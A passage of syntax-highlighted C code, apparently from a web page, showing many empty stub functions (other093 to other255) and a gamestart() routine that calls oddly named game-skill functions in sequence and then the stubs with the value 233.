function_">other093</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other094</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other095</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other096</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other097</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other098</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other099</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other100</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other101</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other102</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other103</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other104</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other105</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other106</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other107</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other108</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other109</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other110</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other111</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other112</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other113</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other114</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other115</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other116</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other117</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other118</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other119</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other120</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other121</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other122</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other123</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other124</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other125</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other126</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other127</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other128</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other129</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other130</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other131</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other132</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other133</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other134</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other135</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other136</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other137</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other138</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other139</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other140</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other141</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other142</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other143</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other144</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other145</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other146</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other147</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other148</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other149</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other150</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other151</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other152</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other153</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other154</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other155</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other156</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other157</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other158</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other159</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other160</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other161</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other162</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other163</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other164</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other165</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other166</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other167</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other168</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other169</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other170</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other171</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other172</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other173</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other174</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other175</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other176</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other177</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other178</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other179</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other180</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other181</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other182</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other183</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other184</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other185</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other186</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other187</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other188</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other189</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other190</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other191</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other192</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other193</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other194</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other195</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other196</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other197</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other198</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other199</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other200</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other201</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other202</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other203</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other204</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other205</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other206</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other207</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other208</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other209</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other210</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other211</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other212</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other213</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other214</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other215</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other216</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other217</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other218</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other219</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other220</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other221</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other222</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other223</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other224</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other225</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other226</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other227</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other228</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other229</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other230</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other231</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other232</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other233</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other234</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other235</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other236</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other237</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other238</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other239</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other240</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other241</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other242</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other243</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other244</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other245</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other246</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other247</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other248</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other249</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other250</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other251</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other252</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other253</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other254</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other255</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gamestart</span><span class="params">()</span>&#123;</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">wuxiangdeyidao();</span><br><span class="line">zhanjinniuza();</span><br><span class="line">guobapenhuo();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">tiandongwanxiang();</span><br><span class="line">wuxiangdeyidao();</span><br><span class="line">zhanjinniuza();</span><br><span class="line"></span><br><span class="line">other000(<span class="number">233</span>);</span><br><span class="line">other001(<span class="number">233</span>);</span><br><span class="line">other002(<span class="number">233</span>);</span><br><span class="line">other003(<span class="number">233</span>);</span><br><span class="line">other004(<span class="number">233</span>);</span><br><span class="line">other005(<span class="number">233</span>);</span><br><span class="line">other006(<span class="number">233</span>);</span><br><span class="line">other007(<span class="number">233</span>);</span><br><span class="line">other008(<span class="number">233</span>);</span><br><span class="line">other009(<span class="number">233</span>);</span><br><span class="line">other010(<span class="number">233</span>);</span><br><span class="line">other011(<span class="number">233</span>);</span><br><span class="line">other012(<span class="number">233</span>);</span><br><span class="line">other013(<span class="number">233</span>);</span><br><span class="line">other014(<span class="number">233</span>);</span><br><span class="line">other015(<span class="number">233</span>);</span><br><span class="line">other016(<span class="number">233</span>);</span><br><span class="line">other017(<span class="number">233</span>);</span><br><span class="line">other018(<span class="number">233</span>);</span><br><span class="line">other019(<span class="number">233</span>);</span><br><span class="line">other020(<span class="number">233</span>);</span><br><span class="line">other021(<span class="number">233</span>);</span><br><span class="line">other022(<span class="number">233</span>);</span><br><span class="line">other023(<span class="number">233</span>);</span><br><span class="line">other024(<span class="number">233</span>);</span><br><span class="line">other025(<span class="number">233</span>);</span><br><span class="line">other026(<span class="number">233</span>);</span><br><span class="line">other027(<span class="number">233</span>);</span><br><span class="line">other028(<span class="number">233</span>);</span><br><span class="line">other029(<span class="number">233</span>);</span><br><span class="line">other030(<span class="number">233</span>);</span><br><span class="line">other031(<span class="number">233</span>);</span><br><span class="line">other032(<span class="number">233</span>);</span><br><span class="line">other033(<span class="number">233</span>);</span><br><span class="line">other034(<span class="number">233</span>);</span><br><span class="line">other035(<span class="number">233</span>);</span><br><span class="line">other036(<span class="number">233</span>);</span><br><span class="line">other037(<span class="number">233</span>);</span><br><span class="line">other038(<span class="number">233</span>);</span><br><span class="line">other039(<span class="number">233</span>);</span><br><span class="line">other040(<span class="number">233</span>);</span><br><span class="line">other041(<span class="number">233</span>);</span><br><span class="line">other042(<span class="number">233</span>);</span><br><span class="line">other043(<span class="number">233</span>);</span><br><span class="line">other044(<span class="number">233</span>);</span><br><span class="line">other045(<span class="number">233</span>);</span><br><span class="line">other046(<span class="number">233</span>);</span><br><span class="line">other047(<span class="number">233</span>);</span><br><span class="line">other048(<span class="number">233</span>);</span><br><span class="line">other049(<span class="number">233</span>);</span><br><span class="line">other050(<span class="number">233</span>);</span><br><span class="line">other051(<span class="number">233</span>);</span><br><span class="line">other052(<span class="number">233</span>);</span><br><span class="line">other053(<span class="number">233</span>);</span><br><span class="line">other054(<span class="number">233</span>);</span><br><span class="line">other055(<span class="number">233</span>);</span><br><span class="line">other056(<span class="number">233</span>);</span><br><span class="line">other057(<span class="number">233</span>);</span><br><span class="line">other058(<span class="number">233</span>);</span><br><span class="line">other059(<span class="number">233</span>);</span><br><span class="line">other060(<span class="number">233</span>);</span><br><span class="line">other061(<span class="number">233</span>);</span><br><span class="line">other062(<span class="number">233</span>);</span><br><span class="line">other063(<span class="number">233</span>);</span><br><span class="line">other064(<span class="number">233</span>);</span><br><span class="line">other065(<span class="number">233</span>);</span><br><span class="line">other066(<span class="number">233</span>);</span><br><span class="line">other067(<span class="number">233</span>);</span><br><span class="line">other068(<span class="number">233</span>);</span><br><span class="line">other069(<span class="number">233</span>);</span><br><span class="line">other070(<span class="number">233</span>);</span><br><span class="line">other071(<span class="number">233</span>);</span><br><span class="line">other072(<span class="number">233</span>);</span><br><span class="line">other073(<span class="number">233</span>);</span><br><span class="line">other074(<span class="number">233</span>);</span><br><span class="line">other075(<span class="number">233</span>);</span><br><span class="line">other076(<span class="number">233</span>);</span><br><span class="line">other077(<span class="number">233</span>);</span><br><span class="line">other078(<span class="number">233</span>);</span><br><span class="line">other079(<span class="number">233</span>);</span><br><span class="line">other080(<span class="number">233</span>);</span><br><span class="line">other081(<span class="number">233</span>);</span><br><span class="line">other082(<span class="number">233</span>);</span><br><span class="line">other083(<span class="number">233</span>);</span><br><span class="line">other084(<span class="number">233</span>);</span><br><span class="line">other085(<span class="number">233</span>);</span><br><span class="line">other086(<span class="number">233</span>);</span><br><span class="line">other087(<span 